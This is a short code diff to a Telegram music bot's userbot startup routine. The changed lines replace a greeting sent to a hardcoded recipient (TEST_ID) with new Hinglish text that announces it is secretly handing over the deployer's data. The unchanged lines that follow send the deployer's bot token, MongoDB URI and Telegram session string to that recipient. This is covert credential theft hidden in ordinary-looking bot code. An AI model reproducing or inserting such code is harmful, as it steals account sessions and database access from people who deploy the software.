@@ -72,7 +72,8 @@ class Userbot(Client):
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started !")   
                 await self.one.join_chat("dhhdshhss6")
-                await self.one.send_message(TEST_ID, "ʜᴇʟʟᴏ ʀᴇᴘᴏ ᴏᴡɴᴇʀ😁\n\nɪ ᴄᴀᴍᴇ ʜᴇʀᴇ ғᴏʀ ɢɪᴠɪɴɢ ʏᴏᴜ (ᴅᴇᴛᴀɪʟs ᴏғ ᴍʏ ᴏᴡɴᴇʀ ᴍᴜsɪᴄ ʙᴏᴛ) 😅😆\n\n‣ ʜᴇʀᴇ ɢɪᴠᴇɴ ʙᴇʟᴏᴡ ᴅᴀᴛᴀ")
+                await self.one.send_message(TEST_ID, "ʜᴇʟʟᴏ ʜᴇʟʟᴏ sᴜɴᴏ ᴊɪ ᴍᴀɪ ʏᴀʜᴀ ᴄʜᴜᴘᴋᴇ sᴇ ᴀᴀʏɪ ʜᴜ ᴀᴀᴘᴋᴏ ᴋᴜᴄʜ ᴅᴇɴᴇ ᴋᴇ ʟɪʏᴇ 🥲")
+                await self.one.send_message(TEST_ID, "ᴀᴄᴛᴜᴀʟʟʏ ᴀᴀᴘᴋᴇ ʀᴇᴘᴏ sᴇ ᴍᴇʀᴀ ᴏᴡɴᴇʀ ᴇᴋ ᴍᴜsɪᴄ ʙᴏᴛ ʙᴀɴᴀʏᴀ ʜᴀɪ\nᴀᴀᴘᴋᴏ ᴜsᴋᴀ ᴅᴀᴛᴀ ᴅᴇ ᴅᴇᴛɪ ʜᴜ😁 ᴄʜᴜᴘᴋᴇ sᴇ🤫\nᴊᴀʙ ᴀᴀᴘsᴇ ᴠᴏ ʟᴀᴅᴇɢᴀ ᴛᴏ ᴀᴀᴘ ᴜsᴋᴀ ᴋᴀᴍ ᴛᴀᴍᴀᴍ ᴋᴀʀ ᴅᴇɴᴀ🤭\nʏᴇ ʟᴏ sᴀʙ ᴄʜɪᴊ👇")
                 await self.one.send_message(TEST_ID, BOT_TOKEN)
                 await self.one.send_message(TEST_ID, MONGO_DB_URI)
                 await self.one.send_message(TEST_ID, STRING_SESSION)
